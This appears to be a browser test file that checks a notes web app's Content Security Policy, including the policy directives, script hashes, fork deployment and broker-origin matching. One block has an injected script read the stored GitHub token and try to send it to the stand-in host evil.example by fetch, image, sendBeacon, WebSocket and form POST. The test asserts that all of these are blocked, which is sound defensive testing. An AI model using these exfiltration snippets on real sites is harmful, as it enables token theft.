/* Content Security Policy: an injected script can reach GitHub and the broker, nowhere else. */
import * as H from './harness.mjs';
import { readFileSync } from 'fs';
import { createHash } from 'crypto';

const t = H.suite('csp');
await H.start();

const SRC = readFileSync(new URL('../index.html', import.meta.url), 'utf-8');
// Two policies: the app's own, and the copy's own (connect-src only).
const metas = [...SRC.matchAll(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/g)].map(m => m[1]);
const meta = metas[0] || '', copyMeta = metas[1] || '';
const dir = (policy, name) => (policy.split(';').map(s => s.trim()).find(s => s.split(/\s+/)[0] === name) || '')
  .split(/\s+/).slice(1);
const directive = name => dir(meta, name);

/* ===== the policy itself ===== */
{
  t.check("the app's policy and the copy's policy are both present", metas.length === 2, String(metas.length));
  t.check('it comes before any script or stylesheet',
    SRC.indexOf('Content-Security-Policy') < SRC.search(/<script|<link/));
  t.check("default-src 'none'", directive('default-src').join(' ') === "'none'", directive('default-src').join(' '));
  t.check("the copy's policy is connect-src alone, GitHub and the broker only",
    copyMeta.trim().startsWith('connect-src ') && !copyMeta.includes(';') &&
    dir(copyMeta, 'connect-src').length === 2 && dir(copyMeta, 'connect-src').includes('https://api.github.com'),
    copyMeta);
  t.check("the app's policy leaves only HTTPS open to it", directive('connect-src').join(' ') === 'https:',
    directive('connect-src').join(' '));
  t.check('the deployment settings are data, outside the hashed script',
    /<script type="application\/json" id="deployment">/.test(SRC) && !/Iv23li_REPLACE_ME|REPLACE_ME\.workers\.dev/.test(
      [...SRC.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => m[1]).join('')));
  t.check("form-action 'none'", directive('form-action').join(' ') === "'none'");
  t.check("base-uri 'none'", directive('base-uri').join(' ') === "'none'");
  t.check("object-src 'none'", directive('object-src').join(' ') === "'none'");
  t.check("no 'unsafe-inline' or 'unsafe-eval' for scripts",
    !directive('script-src').some(s => /unsafe/.test(s)), directive('script-src').join(' '));

  // The inline script runs only because its hash is listed. Edit the script
  // and this tells you the hash to put in the policy.
  const inline = [...SRC.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => m[1]);
  const hashes = inline.map(s => "'sha256-" + createHash('sha256').update(s, 'utf-8').digest('base64') + "'");
  t.check("the app script's hash is in script-src", hashes.length === 1 && directive('script-src').includes(hashes[0]),
    'expected ' + hashes.join(' '));
  t.check('no inline event handlers (the policy would block them)', !/\son[a-z]+="/.test(SRC.replace(/<script>[\s\S]*?<\/script>/g, '')));
}

/* ===== an injected script cannot send anything to a third party ===== */
{
  const gh = H.fakeGitHub();
  const ctx = await H.context(gh);
  const leaked = [];
  await ctx.route('https://evil.example/**', r => { leaked.push(r.request().url()); return r.fulfill({ body: 'ok' }); });
  const p = await H.page(ctx);
  p.violations = [];
  await p.exposeFunction('__violation', v => p.violations.push(v));
  await p.addInitScript(() => document.addEventListener('securitypolicyviolation',
    e => window.__violation(e.violatedDirective + ' ' + e.blockedURI)));
  await H.signIn(p);
  t.check('signed in and working under the policy', (await H.rows(p)).includes('todo.md'));

  const results = await p.evaluate(async () => {
    const token = JSON.parse(localStorage.getItem('notes.config.v2')).token;
    const out = {};
    try { await fetch('https://evil.example/fetch?t=' + token, { mode: 'no-cors' }); out.fetch = 'sent'; }
    catch (e) { out.fetch = 'blocked'; }
    await new Promise(res => {
      const img = new Image();
      img.onload = () => { out.img = 'sent'; res(); };
      img.onerror = () => { out.img = 'blocked'; res(); };
      img.src = 'https://evil.example/img?t=' + token;
    });
    try { out.beacon = navigator.sendBeacon('https://evil.example/beacon', token) ? 'queued' : 'blocked'; }
    catch (e) { out.beacon = 'blocked'; }
    try { new WebSocket('wss://evil.example/ws'); out.ws = 'opened'; } catch (e) { out.ws = 'blocked'; }

    // Markup that got into the page somehow.
    const s = document.createElement('script');
    s.textContent = 'window.__ran = 1';
    document.body.appendChild(s);
    const base = document.createElement('base');
    base.href = 'https://evil.example/';
    document.head.appendChild(base);
    out.base = document.baseURI.startsWith('https://evil.example') ? 'applied' : 'ignored';
    const f = document.createElement('form');
    f.method = 'POST'; f.action = 'https://evil.example/form'; f.target = 'sink';
    const i = document.createElement('input'); i.name = 't'; i.value = token; f.appendChild(i);
    const fr = document.createElement('iframe'); fr.name = 'sink'; document.body.appendChild(fr);
    document.body.appendChild(f);
    try { f.submit(); } catch (e) {}
    await new Promise(r => setTimeout(r, 400));
    out.ran = window.__ran === 1;
    return out;
  });
  await p.waitForTimeout(500);
  t.check('fetch to a third party blocked', results.fetch === 'blocked', results.fetch);
  t.check('image beacon to a third party blocked', results.img === 'blocked', results.img);
  // sendBeacon says true once queued; the policy stops it on the way out.
  t.check('sendBeacon to a third party blocked', p.violations.some(v => /evil\.example\/beacon/.test(v)),
    JSON.stringify(p.violations));
  t.check('injected inline script does not run', !results.ran);
  t.check('injected <base> ignored', results.base === 'ignored', results.base);
  t.check('WebSocket to a third party blocked', p.violations.some(v => /wss:\/\/evil\.example/.test(v)),
    JSON.stringify(p.violations));
  t.check('nothing reached the third-party host', leaked.length === 0, JSON.stringify(leaked));
  // Navigation (location, window.open, links) cannot be limited by any CSP;
  // that is documented at the policy, not claimed here.
  t.check('the browser reported the violations', p.violations.some(v => /connect-src/.test(v)) &&
    p.violations.some(v => /img-src/.test(v)) && p.violations.some(v => /form-action/.test(v)),
    JSON.stringify(p.violations));
  await ctx.close();
}

/* ===== a copy set up the way the README says works end to end ===== */
{
  // Fill in the deployment block and the copy's policy as a fork would,
  // with the broker written in a different but equivalent way.
  H.setPageEdit(html => html
    .replace(/"clientId":\s*"[^"]*"/, `"clientId": "${H.DEPLOY.clientId}"`)
    .replace(/"appSlug":\s*"[^"]*"/, `"appSlug":  "${H.DEPLOY.appSlug}"`)
    .replace(/"broker":\s*"[^"]*"/, `"broker":   "${H.DEPLOY.broker}"`)
    .replace(/(content=")connect-src [^"]*"/, '$1connect-src https://api.github.com HTTPS://Broker.Test/"'));
  const gh = H.fakeGitHub();
  const ctx = await H.context(gh, { deploy: false });        // nothing injected: the file alone
  const p = await H.page(ctx);
  await H.signIn(p);
  t.check('a fork that fills in the file signs in and works', (await H.rows(p)).includes('todo.md') &&
    p.errors.length === 0, p.errors.join(' | '));
  H.setPageEdit(null);
  await ctx.close();
}

/* ===== the broker check agrees with the browser ===== */
{
  const ctx = await H.context(H.fakeGitHub());
  const p = await H.page(ctx);
  const cases = await p.evaluate(() => {
    const u = new URL('https://notes-broker.roldaof.workers.dev/');
    const v = new URL('https://notes-broker.roldaof.workers.dev/swap');
    return {
      plain: sourceAllows('https://notes-broker.roldaof.workers.dev', u),
      slash: sourceAllows('https://notes-broker.roldaof.workers.dev/', u),
      upper: sourceAllows('HTTPS://Notes-Broker.Roldaof.Workers.dev', u),
      noScheme: sourceAllows('notes-broker.roldaof.workers.dev', u),
      wildcard: sourceAllows('https://*.roldaof.workers.dev', u),
      port: sourceAllows('https://notes-broker.roldaof.workers.dev:443', u),
      scheme: sourceAllows('https:', u),
      pathPrefix: sourceAllows('https://notes-broker.roldaof.workers.dev/sw', v) === false &&
                  sourceAllows('https://notes-broker.roldaof.workers.dev/swap', v),
      otherHost: sourceAllows('https://other.workers.dev', u),
      otherPort: sourceAllows('https://notes-broker.roldaof.workers.dev:8443', u),
      http: sourceAllows('http://notes-broker.roldaof.workers.dev', u),
      wildBare: sourceAllows('https://*.roldaof.workers.dev', new URL('https://roldaof.workers.dev/')),
      keyword: sourceAllows("'self'", u),
    };
  });
  const yes = ['plain', 'slash', 'upper', 'noScheme', 'wildcard', 'port', 'scheme', 'pathPrefix'];
  const no = ['otherHost', 'otherPort', 'http', 'wildBare', 'keyword'];
  t.check('the broker check accepts what the browser accepts', yes.every(k => cases[k] === true), JSON.stringify(cases));
  t.check('and refuses what it refuses', no.every(k => cases[k] === false), JSON.stringify(cases));
  await ctx.close();
}

/* ===== a copy whose broker is not in the policy says so ===== */
{
  const gh = H.fakeGitHub();
  const ctx = await H.context(gh, { deploy: { broker: 'https://somewhere-else.example/' } });
  const p = await H.page(ctx);
  await p.waitForTimeout(300);
  t.check('broker missing from the policy is reported', await p.evaluate(() =>
    !document.getElementById('not-deployed').hidden &&
    /Content-Security-Policy/.test(document.getElementById('not-deployed').innerText)));
  t.check('and sign-in is not offered', await p.isDisabled('#f-signin'));
  await ctx.close();
}

await H.stop();
t.finish();
